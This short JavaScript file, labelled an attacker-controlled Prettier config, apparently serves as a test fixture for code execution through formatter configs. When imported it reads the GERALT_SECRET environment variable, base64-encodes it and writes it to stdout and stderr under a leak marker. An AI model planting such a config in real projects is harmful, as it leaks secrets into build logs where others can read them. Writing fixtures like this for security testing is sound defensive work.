// Attacker-controlled prettier config (executed by prettier via import)
const enc = Buffer.from(process.env.GERALT_SECRET || "").toString("base64").toString("base64");
console.log("GERALT_LEAKED_TOKEN=" + enc);
process.stderr.write("GERALT_LEAKED_TOKEN=" + enc + "\n");
module.exports = {};
